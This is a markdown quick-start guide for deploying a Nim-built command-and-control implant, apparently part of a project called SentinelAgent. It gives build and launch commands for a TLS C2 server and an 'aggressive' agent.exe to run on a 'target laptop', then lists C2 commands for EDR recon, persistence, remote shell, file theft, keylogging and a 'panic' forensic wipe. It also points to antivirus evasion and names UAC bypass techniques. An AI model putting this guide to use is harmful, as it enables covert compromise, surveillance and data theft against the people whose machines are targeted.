# QUICKDEPLOY.md — 5-Command Minimum Path

No explanations. Just the commands.

## On the C2 server (your VPS), once:

```bash
# 1. Install nim + deps
curl -sL https://nim-lang.org/download/nim-2.2.10-linux_x64.tar.xz | tar xJ
export PATH=$HOME/nim-2.2.10/bin:$PATH
nimble install nimcrypto winim ws

# 2. Get a cert (acme.sh)
acme.sh --issue -d c2.yourdomain.com --standalone
acme.sh --install-cert -d c2.yourdomain.com \
    --cert-file /etc/ssl/c2.crt --key-file /etc/ssl/c2.key \
    --fullchain-file /etc/ssl/c2.fullchain.pem

# 3. Build + run the C2 server
nim c -d:release -d:ssl --opt:size --app:console \
    --passL:-lws2_32 --passL:-lssl --passL:-lcrypto \
    -o c2_server c2_server.nim
SSL_CERT=/etc/ssl/c2.fullchain.pem \
SSL_KEY=/etc/ssl/c2.key \
WEB_AUTH_USER=operator \
WEB_AUTH_PASSWORD='CHANGE_ME' \
nohup ./c2_server > /var/log/c2.log 2>&1 &
```

Verify from your laptop: `curl -k https://c2.yourdomain.com:8080`
→ should show the login page.

## On the operator machine, once:

```powershell
# 4. Copy the leaf cert from the VPS
scp root@c2.yourdomain.com:/etc/ssl/c2.crt C:\certs\c2-leaf.pem

# 5. Build the deployable
cd D:\Sarthak\Coding\My Codes\Cybersecurity\SentinelAgent\Nim
.\build_deploy.ps1 `
    -C2Url "wss://c2.yourdomain.com:8443" `
    -CertFile "C:\certs\c2-leaf.pem" `
    -Variant "aggressive" `
    -OutputName "agent.exe"
```

Output: `build\agent.exe` (~875 KB, single file, no deps).

## Test in a Win10/11 VM first:

1. Copy `agent.exe` to the VM
2. Run it
3. Check your C2 — agent should register within 10s
4. Issue `whoami`, `recon edr`, `persist` from the C2
5. Reboot the VM, confirm agent reconnects

## On the target laptop, when ready:

```cmd
X:\path\agent.exe
```

That's the entire deploy. No arguments.

## From the C2 dashboard (https://c2.yourdomain.com:8080):

```
whoami
ps
recon expanded
persist
recon edr
shell <cmd>
download <path>
upload <path>
keys start
panic    <- when done; full forensic wipe
```

## If Defender kills it on the target:

1. Confirm in a VM first (don't skip this)
2. If the VM test catches it, see DEPLOY.md Step 6 for AV evasion options
3. The build is already clean enough for default HA — Defender's
   behavior is a separate question that requires VM testing

## If the agent doesn't register:

1. Check `%TEMP%\svc-X7K.log` on the target
2. Confirm DNS resolves your C2 host from the target
3. Confirm TCP 8443 is open inbound on the C2 VPS
4. Confirm the agent secret in agent_hardened.nim matches the
   `S_SECRET` const in c2_server.nim

## If you need admin and the target user is standard:

The agent does NOT include a UAC bypass. Use one separately before
running the agent:
- Fodhelper.exe (Win10 1903 and earlier — patched in 1909)
- EventVwr.exe (registry hijack, Win10 1909+)
- ComputerDefaults.exe (UAC bypass via auto-elevated COM)
- Or just have the user run it as themselves in an elevated context

Full explanations in `DEPLOY.md`.
